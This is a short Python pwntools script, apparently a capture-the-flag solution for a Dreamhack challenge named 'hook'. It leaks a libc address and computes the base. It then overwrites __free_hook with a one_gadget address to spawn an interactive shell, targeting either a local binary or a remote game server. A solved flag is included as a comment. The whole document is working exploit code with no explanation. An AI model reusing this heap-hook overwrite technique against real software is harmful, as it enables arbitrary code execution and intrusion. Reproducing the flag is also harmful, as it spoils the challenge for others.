from pwn import * 

local = 0

if local == 1 :
	p = process("./hook")
	one_gadget = [0x4f365,0x4f3c2,0x10a45c]
	hook_offset = 0x3ed8e8
	stdout_offset = 0x3ec760
else :
	p = remote("host1.dreamhack.games",8473)
	one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
	hook_offset = 0x3c67a8
	stdout_offset = 0x3c5620

p.recvuntil("stdout:")

recv = int(p.recvline(),16)
libc_base = recv-stdout_offset
free_hook = libc_base + hook_offset
one = libc_base + one_gadget[1]

log.info(hex(libc_base))

p.sendlineafter("Size:",str(100))

payload1 = ""
payload1 += p64(free_hook)
payload1 += p64(one)

pause()

p.sendlineafter("Data:",payload1)

p.interactive()

#DH{5203c83c34143bab58f653d1c1339016}